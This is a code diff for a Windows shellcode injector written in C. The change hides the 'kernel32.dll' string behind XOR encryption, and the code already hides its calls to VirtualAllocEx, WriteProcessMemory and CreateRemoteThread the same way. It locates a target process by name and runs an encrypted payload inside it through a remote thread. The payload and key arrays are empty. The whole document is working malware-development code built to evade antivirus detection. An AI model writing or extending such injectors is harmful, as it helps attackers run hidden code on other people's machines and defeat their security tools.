@@ -23,6 +23,9 @@ unsigned char s_clh[] = { };
 unsigned char s_p32f[] = { };
 unsigned char s_p32n[] = { };
 
+// encrypted kernel32.dll
+unsigned char s_k32[] = { };
+
 // length
 unsigned int my_payload_len = sizeof(my_payload);
 unsigned int my_proc_len = sizeof(my_proc);
@@ -34,11 +37,13 @@ unsigned int s_op_len = sizeof(s_op);
 unsigned int s_clh_len = sizeof(s_clh);
 unsigned int s_p32f_len = sizeof(s_p32f);
 unsigned int s_p32n_len = sizeof(s_p32n);
+unsigned int s_k32_len = sizeof(s_k32);
 
 // keys
 char my_payload_key[] = "";
 char my_proc_key[] = "";
 char f_key[] = "";
+char k32_key[] = "";
 
 LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 HANDLE (WINAPI * pCreateRemoteThread)(
@@ -82,10 +87,10 @@ int FindTarget(const char *procname) {
         int pid = 0;
 
         XOR((char *) s_p32f, s_p32f_len, f_key, sizeof(f_key));
-        pProcess32First = GetProcAddress(GetModuleHandle("kernel32.dll"), s_p32f);
+        pProcess32First = GetProcAddress(GetModuleHandle(s_k32), s_p32f);
 
         XOR((char *) s_p32n, s_p32n_len, f_key, sizeof(f_key));
-        pProcess32Next = GetProcAddress(GetModuleHandle("kernel32.dll"), s_p32n);
+        pProcess32Next = GetProcAddress(GetModuleHandle(s_k32), s_p32n);
 
         hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
@@ -115,25 +120,25 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
         LPVOID pRemoteCode = NULL;
         HANDLE hThread = NULL;
 
-         // decrypt VirtualAllocEx function call
+        // decrypt VirtualAllocEx function call
         XOR((char *) s_vaex, s_vaex_len, f_key, sizeof(f_key));
-        pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vaex);
+        pVirtualAllocEx = GetProcAddress(GetModuleHandle(s_k32), s_vaex);
         pRemoteCode = pVirtualAllocEx(hProc, NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
 
         // decrypt WriteProcessMemory function call
         XOR((char *) s_wpm, s_wpm_len, f_key, sizeof(f_key));
-        pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wpm);
+        pWriteProcessMemory = GetProcAddress(GetModuleHandle(s_k32), s_wpm);
         pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
 
         // decrypt CreateRemoteThread function call
         XOR((char *) s_cth, s_cth_len, f_key, sizeof(f_key));
-        pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_cth);
+        pCreateRemoteThread = GetProcAddress(GetModuleHandle(s_k32), s_cth);
         hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
 
         if (hThread != NULL) {
                 // decrypt WaitForSingleObject function call
                 XOR((char *) s_wfso, s_wfso_len, f_key, sizeof(f_key));
-                pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
+                pWaitForSingleObject = GetProcAddress(GetModuleHandle(s_k32), s_wfso);
                 pWaitForSingleObject(hThread, 500);
 
                 pCloseHandle(hThread);
@@ -148,9 +153,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     int pid = 0;
     HANDLE hProc = NULL;
 
+    // decrypt kernel32.dll
+    XOR((char *) s_k32, s_k32_len, k32_key, sizeof(k32_key));
+
     // decrypt CloseHandle function call
     XOR((char *) s_clh, s_clh_len, f_key, sizeof(f_key));
-    pCloseHandle = GetProcAddress(GetModuleHandle("kernel32.dll"), s_clh);
+    pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), s_clh);
 
     // decrypt process name
     XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));
@@ -160,7 +168,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (pid) {
         // decrypt OpenProcess function call
         XOR((char *) s_op, s_op_len, f_key, sizeof(f_key));
-        pOpenProcess = GetProcAddress(GetModuleHandle("kernel32.dll"), s_op);
+        pOpenProcess = GetProcAddress(GetModuleHandle(s_k32), s_op);
 
         // try to open target process
         hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
